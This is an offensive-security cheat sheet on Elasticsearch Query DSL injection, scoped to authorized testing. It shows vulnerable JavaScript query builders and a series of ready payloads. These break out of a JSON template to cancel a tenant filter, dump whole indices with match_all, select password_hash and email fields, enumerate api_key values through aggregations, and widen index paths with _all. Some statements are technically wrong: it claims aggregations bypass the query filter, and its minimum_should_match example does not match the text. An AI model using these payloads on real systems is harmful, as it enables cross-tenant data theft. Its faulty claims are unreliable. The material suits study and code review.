---
title: "Elasticsearch Query DSL injection in the JSON request body"
description: "When user input is concatenated into the JSON Query DSL or spread into a bool clause, an attacker injects should/must_not clauses or replaces the query to read documents outside intended scope."
keywords:
  - Query DSL injection
  - bool query
  - should clause
  - must_not
  - JSON injection
  - Elasticsearch
---

# Query DSL injection

The Query DSL is Elasticsearch's structured JSON query language. Injection here is not about Lucene operators inside a string; it is about controlling the **structure** of the JSON body. When an application builds the request by string-concatenating user input into a JSON template, or by spreading parsed request JSON directly into a `bool` clause, an attacker supplies extra clauses or replaces the query object, broadening or redirecting the search past the filters the application intended to enforce.

> **Scope.** For authorized penetration tests, CTF labs, and code review of systems you own or are contracted to assess.

## Vulnerable pattern: string concatenation

```js
const body = `{
  "query": {
    "bool": {
      "must": [ { "match": { "title": "${userInput}" } } ],
      "filter": [ { "term": { "tenant": "acme" } } ]
    }
  }
}`;
```

Because `userInput` lands inside raw JSON text, a crafted value closes the `match` object and injects sibling clauses. Input:

```
x" } } ], "should": [ { "exists": { "field": "ssn" } } ], "must_not": [ { "term": { "tenant": "acme"
```

produces a body where the tenant `must_not` cancels the intended `filter` scope and a `should` clause pulls in documents carrying sensitive fields.

## Vulnerable pattern: JSON spread into bool

```js
// req.body.filters is attacker-controlled JSON
const body = {
  query: { bool: { must: [ ...req.body.filters ],
                   filter: [ { term: { tenant: "acme" } } ] } }
};
```

Here no string parsing is needed; the attacker submits well-formed clause objects.

## Injecting should and must_not

A `should` clause with `minimum_should_match` forced to 0 adds an always-satisfiable branch, while `must_not` removes an unwanted restriction:

```json
{
  "filters": [
    { "match_all": {} }
  ]
}
```

`match_all` in the `must` array matches every document; combined with a removed or overridden tenant filter the search returns the whole index.

More targeted, a `should` that references another tenant's data:

```json
{ "bool": { "should": [
    { "term": { "tenant": "acme" } },
    { "term": { "tenant": "globex" } }
  ], "minimum_should_match": 1 } }
```

## Replacing the query entirely

When the injection point sits at the top of the body, the cleanest result is to overwrite the whole `query` object:

```json
{ "query": { "match_all": {} }, "size": 10000 }
```

Pairing `match_all` with a large `size`, or with `_source` field selection, turns a scoped lookup into a bulk export:

```json
{ "query": { "match_all": {} }, "_source": ["password_hash","email"], "size": 5000 }
```

## Pivoting through aggregations

If the body accepts an injected `aggs` block, aggregations read across the entire index regardless of the query filter, which only limits the document set, so terms aggregations enumerate high-cardinality secret-bearing fields:

```json
{ "size": 0, "aggs": {
    "leak": { "terms": { "field": "api_key.keyword", "size": 1000 } } } }
```

## Multi-index breakout

Where the target index is built from input (`/${idx}/_search`), injecting a wildcard or comma-listed index reaches data stores the caller should not see:

```
_all/_search
*,-/_search
tenant-acme,tenant-globex/_search
```

The tell for all of these is any request body or index path assembled from user input without a typed builder: field values, clause objects, or index names that are never constrained to an allow-list.

## References

- [Elasticsearch: Query DSL](https://www.elastic.co/guide/en/elasticsearch/reference/current/query-dsl.html)
- [Elasticsearch: Boolean query](https://www.elastic.co/guide/en/elasticsearch/reference/current/query-dsl-bool-query.html)
- [PayloadsAllTheThings: NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
